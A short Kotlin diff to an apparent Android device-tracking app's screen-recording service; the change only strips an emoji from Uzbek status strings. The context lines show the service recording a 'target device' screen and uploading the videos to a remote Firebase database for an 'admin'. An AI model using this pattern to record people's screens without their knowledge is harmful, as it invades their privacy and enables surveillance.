@@ -198,7 +198,7 @@ class ScreenRecordService : Service() {
             val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
             val mediaRef = database.getReference("tracking/devices/$targetDeviceId/media")
             mediaRef.child("is_screen_recording").setValue(true)
-            mediaRef.child("status").setValue("📹 Ekran yozilmoqda...")
+            mediaRef.child("status").setValue("Ekran yozilmoqda...")
 
             // 10 daqiqalik xavfsizlik chegarasi (agar admin to'xtatishni unutsa)
             handler.postDelayed({
@@ -267,7 +267,7 @@ class ScreenRecordService : Service() {
 
                     mediaRef.child("latest_screen").setValue(item)
                     mediaRef.child("archive_screen").push().setValue(item)
-                    mediaRef.child("status").setValue("📹 Ekran video yozuvi saqlandi ($durationSec sek, ${bytes.size / 1024} KB)")
+                    mediaRef.child("status").setValue("Ekran video yozuvi saqlandi ($durationSec sek, ${bytes.size / 1024} KB)")
                 } catch (e: Exception) {
                     Log.e(TAG, "Error uploading screen video", e)
                     mediaRef.child("status").setValue("Video saqlashda xatolik")
